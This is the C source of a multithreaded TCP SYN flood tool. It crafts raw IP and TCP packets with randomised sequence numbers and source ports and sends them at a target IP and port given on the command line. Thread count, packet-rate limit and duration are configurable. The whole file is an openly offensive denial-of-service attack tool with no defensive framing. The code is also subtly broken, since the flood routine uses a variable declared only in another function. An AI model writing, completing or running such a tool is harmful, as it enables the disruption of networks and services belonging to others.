#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <net/if.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define MAXTTL 255

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
volatile int running = 1;

char source_ip[16] = {0};

struct tcp_pseudo {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t zero;
    uint8_t protocol;
    uint16_t length;
};

// Initialize random generator
void init_rand(unsigned long int x) {
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (int i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

// Custom CMWC RNG
unsigned long int rand_cmwc(void) {
    static unsigned long int i = 4095;
    unsigned long long int t, a = 18782LL;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) { x++; c++; }
    return (Q[i] = r - x);
}

// Checksum function
unsigned short csum(unsigned short *buf, int count) {
    unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) { sum += *(unsigned char *)buf; }
    while (sum >> 16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

// Get local IP address based on default interface
void get_local_ip(char *ip_buf) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        strncpy(ip_buf, "0.0.0.0", 9);
        return;
    }

    struct ifconf ifc;
    struct ifreq ifr[10];
    ifc.ifc_len = sizeof(ifr);
    ifc.ifc_buf = (char *)ifr;

    if (ioctl(fd, SIOCGIFCONF, &ifc) == -1) {
        perror("ioctl");
        strncpy(ip_buf, "0.0.0.0", 9);
        close(fd);
        return;
    }

    for (int i = 0; i < (ifc.ifc_len / sizeof(struct ifreq)); i++) {
        // Skip loopback
        if (strcmp(ifr[i].ifr_name, "lo") == 0) continue;

        struct sockaddr_in *ip = (struct sockaddr_in *)&ifr[i].ifr_addr;
        strcpy(ip_buf, inet_ntoa(ip->sin_addr));
        close(fd);
        return;
    }

    // Fallback if no interface found
    strncpy(ip_buf, "0.0.0.0", 9);
    close(fd);
}

// Setup IP header
void setup_ip_header(struct iphdr *iph, const char *source_ip, const char *dest_ip) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->tot_len = htons(packet_size);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip);
    iph->daddr = inet_addr(dest_ip);
    iph->check = csum((unsigned short *)iph, iph->ihl * 4);
}

// Setup TCP header
void setup_tcp_header(struct tcphdr *tcph) {
    tcph->source = htons(5678);
    tcph->seq = rand_cmwc() & 0xFFFFFFFF;
    tcph->ack_seq = 0;
    tcph->res2 = 3;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

// TCP pseudo header for checksum
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo pseudohead;

    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.protocol = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));

    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned char *pseudogram = malloc(totaltcp_len);
    if (pseudogram == NULL) {
        perror("malloc");
        exit(1);
    }

    memcpy(pseudogram, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy(pseudogram + sizeof(struct tcp_pseudo), tcph, sizeof(struct tcphdr));

    unsigned short checksum = csum((unsigned short *)pseudogram, totaltcp_len);
    free(pseudogram);
    return checksum;
}

// Signal handler for graceful shutdown
void handle_signal(int sig) {
    printf("\n[!] Shutting down...\n");
    running = 0;
}

// Flood thread function
void *flood(void *par1) {
    char *target_ip = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("[Error] Socket");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("[Error] setsockopt");
        close(s);
        pthread_exit(NULL);
    }

    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    init_rand(time(NULL));

    while (running) {
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph, source_ip, target_ip);
        setup_tcp_header(tcph);
        tcph->dest = htons(floodport);
        tcph->seq = rand_cmwc() & 0xFFFFFFFF;
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);

        if (sendto(s, datagram, packet_size, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("[Error] sendto");
        }
        pps++;
        if (pps > limiter && limiter != -1) {
            usleep(sleeptime);
        }
    }

    close(s);
    pthread_exit(NULL);
}

// Usage message
void print_usage(const char *progname) {
    printf("Usage: sudo %s <target_ip> <port> <threads> <pps_limit (-1 for no limit)> <duration_seconds>\n", progname);
    printf("Example: sudo %s 192.168.1.10 80 4 -1 60\n", progname);
}

// Main
int main(int argc, char *argv[]) {
    if (argc != 6) {
        print_usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    signal(SIGINT, handle_signal);

    const char *target_ip = argv[1];
    floodport = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    int maxpps = atoi(argv[4]);
    int duration = atoi(argv[5]);

    // Automatically detect your IP address
    get_local_ip(source_ip);
    printf("[*] Detected source IP: %s\n", source_ip);

    printf("[*] Target IP: %s\n", target_ip);
    printf("[*] Port: %d\n", floodport);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] PPS limit: %d\n", maxpps);
    printf("[*] Duration: %d seconds\n", duration);

    limiter = maxpps;
    pps = 0;
    sleeptime = 100;
    running = 1;

    pthread_t threads[num_threads];

    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, flood, (void *)target_ip) != 0) {
            perror("pthread_create");
        }
    }

    printf("[*] Starting flood...\n");
    for (int i = 0; i < duration && running; i++) {
        sleep(1);
        if (pps > limiter && limiter != -1) {
            sleeptime += 10;
        } else if (sleeptime > 25) {
            sleeptime -= 10;
        }
        pps = 0;
    }

    running = 0;

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("[*] Flood finished.\n");
    return 0;
}